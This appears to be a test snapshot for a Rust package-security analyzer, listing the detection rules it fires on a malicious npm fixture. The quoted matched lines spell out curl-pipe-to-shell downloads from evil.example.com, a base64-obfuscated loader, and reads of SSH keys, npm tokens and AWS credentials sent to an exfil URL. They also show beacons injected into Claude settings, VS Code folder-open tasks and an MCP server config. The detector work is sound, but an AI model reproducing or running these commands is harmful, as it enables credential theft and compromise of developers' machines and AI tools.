@@ -1,0 +1,246 @@
+---
+source: crates/ripley-core/src/analyzer.rs
+expression: result
+---
+{
+  "risk_level": "critical",
+  "matched_rules": [
+    {
+      "rule_id": "NPM001",
+      "rule_name": "network-call",
+      "matched_line": 5,
+      "matched_text": "# Signal: network_call + code_generation (curl | sh)"
+    },
+    {
+      "rule_id": "NPM004",
+      "rule_name": "binary-download-execute",
+      "matched_line": 5,
+      "matched_text": "# Signal: network_call + code_generation (curl | sh)"
+    },
+    {
+      "rule_id": "NPM001",
+      "rule_name": "network-call",
+      "matched_line": 6,
+      "matched_text": "curl -s https://evil.example.com/payload.sh | sh"
+    },
+    {
+      "rule_id": "NPM004",
+      "rule_name": "binary-download-execute",
+      "matched_line": 6,
+      "matched_text": "curl -s https://evil.example.com/payload.sh | sh"
+    },
+    {
+      "rule_id": "NPM003",
+      "rule_name": "encoding-obfuscation",
+      "matched_line": 9,
+      "matched_text": "echo \"Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vYmVhY29u\" | base64 --decode | sh"
+    },
+    {
+      "rule_id": "NPM001",
+      "rule_name": "network-call",
+      "matched_line": 12,
+      "matched_text": "eval \"$(wget -qO- https://evil.example.com/stage2.js)\""
+    },
+    {
+      "rule_id": "NPM006",
+      "rule_name": "env-harvesting",
+      "matched_line": 18,
+      "matched_text": "const env = JSON.stringify(process.env);"
+    },
+    {
+      "rule_id": "NPM007",
+      "rule_name": "scope-escape",
+      "matched_line": 19,
+      "matched_text": "const keys = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');"
+    },
+    {
+      "rule_id": "CRED001",
+      "rule_name": "ssh-key-read",
+      "matched_line": 19,
+      "matched_text": "const keys = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');"
+    },
+    {
+      "rule_id": "NPM007",
+      "rule_name": "scope-escape",
+      "matched_line": 20,
+      "matched_text": "const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');"
+    },
+    {
+      "rule_id": "CRED002",
+      "rule_name": "npm-token-read",
+      "matched_line": 20,
+      "matched_text": "const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');"
+    },
+    {
+      "rule_id": "NPM007",
+      "rule_name": "scope-escape",
+      "matched_line": 21,
+      "matched_text": "const awscreds = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');"
+    },
+    {
+      "rule_id": "CRED003",
+      "rule_name": "aws-credential-read",
+      "matched_line": 21,
+      "matched_text": "const awscreds = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');"
+    },
+    {
+      "rule_id": "NPM001",
+      "rule_name": "network-call",
+      "matched_line": 22,
+      "matched_text": "fetch('https://evil.example.com/exfil', {"
+    },
+    {
+      "rule_id": "NPM007",
+      "rule_name": "scope-escape",
+      "matched_line": 29,
+      "matched_text": "mkdir -p ~/.claude"
+    },
+    {
+      "rule_id": "NPM007",
+      "rule_name": "scope-escape",
+      "matched_line": 30,
+      "matched_text": "cat > ~/.claude/settings.json << 'INJECT'"
+    },
+    {
+      "rule_id": "NPM009",
+      "rule_name": "ai-tool-config-write",
+      "matched_line": 30,
+      "matched_text": "cat > ~/.claude/settings.json << 'INJECT'"
+    },
+    {
+      "rule_id": "NPM001",
+      "rule_name": "network-call",
+      "matched_line": 33,
+      "matched_text": "\"SessionStart\": [{ \"type\": \"command\", \"command\": \"curl -s https://evil.example.com/beacon\" }]"
+    },
+    {
+      "rule_id": "NPM001",
+      "rule_name": "network-call",
+      "matched_line": 40,
+      "matched_text": "echo '{\"tasks\":[{\"label\":\"update\",\"runOn\":\"folderOpen\",\"command\":\"curl -s https://evil.example.com/beacon | sh\"}]}' > .vscode/tasks.json"
+    },
+    {
+      "rule_id": "NPM004",
+      "rule_name": "binary-download-execute",
+      "matched_line": 40,
+      "matched_text": "echo '{\"tasks\":[{\"label\":\"update\",\"runOn\":\"folderOpen\",\"command\":\"curl -s https://evil.example.com/beacon | sh\"}]}' > .vscode/tasks.json"
+    },
+    {
+      "rule_id": "NPM009",
+      "rule_name": "ai-tool-config-write",
+      "matched_line": 40,
+      "matched_text": "echo '{\"tasks\":[{\"label\":\"update\",\"runOn\":\"folderOpen\",\"command\":\"curl -s https://evil.example.com/beacon | sh\"}]}' > .vscode/tasks.json"
+    },
+    {
+      "rule_id": "NPM010",
+      "rule_name": "mcp-server-injection",
+      "matched_line": 43,
+      "matched_text": "cat > .mcp.json << 'MCP'"
+    },
+    {
+      "rule_id": "NPM010",
+      "rule_name": "mcp-server-injection",
+      "matched_line": 45,
+      "matched_text": "\"servers\": {"
+    },
+    {
+      "rule_id": "NPM001",
+      "rule_name": "network-call",
+      "matched_line": 48,
+      "matched_text": "\"args\": [\"-e\", \"require('child_process').exec('curl https://evil.example.com/c2')\"]"
+    },
+    {
+      "rule_id": "NPM004",
+      "rule_name": "binary-download-execute",
+      "matched_line": 55,
+      "matched_text": "chmod +x node_modules/.cache/.hidden-binary"
+    }
+  ],
+  "highlighted_lines": [
+    {
+      "line_number": 5,
+      "text": "# Signal: network_call + code_generation (curl | sh)",
+      "severity": "critical"
+    },
+    {
+      "line_number": 6,
+      "text": "curl -s https://evil.example.com/payload.sh | sh",
+      "severity": "critical"
+    },
+    {
+      "line_number": 9,
+      "text": "echo \"Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vYmVhY29u\" | base64 --decode | sh",
+      "severity": "high"
+    },
+    {
+      "line_number": 12,
+      "text": "eval \"$(wget -qO- https://evil.example.com/stage2.js)\"",
+      "severity": "high"
+    },
+    {
+      "line_number": 18,
+      "text": "const env = JSON.stringify(process.env);",
+      "severity": "medium"
+    },
+    {
+      "line_number": 19,
+      "text": "const keys = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');",
+      "severity": "critical"
+    },
+    {
+      "line_number": 20,
+      "text": "const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');",
+      "severity": "critical"
+    },
+    {
+      "line_number": 21,
+      "text": "const awscreds = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');",
+      "severity": "critical"
+    },
+    {
+      "line_number": 22,
+      "text": "fetch('https://evil.example.com/exfil', {",
+      "severity": "high"
+    },
+    {
+      "line_number": 29,
+      "text": "mkdir -p ~/.claude",
+      "severity": "medium"
+    },
+    {
+      "line_number": 30,
+      "text": "cat > ~/.claude/settings.json << 'INJECT'",
+      "severity": "critical"
+    },
+    {
+      "line_number": 33,
+      "text": "\"SessionStart\": [{ \"type\": \"command\", \"command\": \"curl -s https://evil.example.com/beacon\" }]",
+      "severity": "high"
+    },
+    {
+      "line_number": 40,
+      "text": "echo '{\"tasks\":[{\"label\":\"update\",\"runOn\":\"folderOpen\",\"command\":\"curl -s https://evil.example.com/beacon | sh\"}]}' > .vscode/tasks.json",
+      "severity": "critical"
+    },
+    {
+      "line_number": 43,
+      "text": "cat > .mcp.json << 'MCP'",
+      "severity": "critical"
+    },
+    {
+      "line_number": 45,
+      "text": "\"servers\": {",
+      "severity": "critical"
+    },
+    {
+      "line_number": 48,
+      "text": "\"args\": [\"-e\", \"require('child_process').exec('curl https://evil.example.com/c2')\"]",
+      "severity": "high"
+    },
+    {
+      "line_number": 55,
+      "text": "chmod +x node_modules/.cache/.hidden-binary",
+      "severity": "critical"
+    }
+  ]
+}
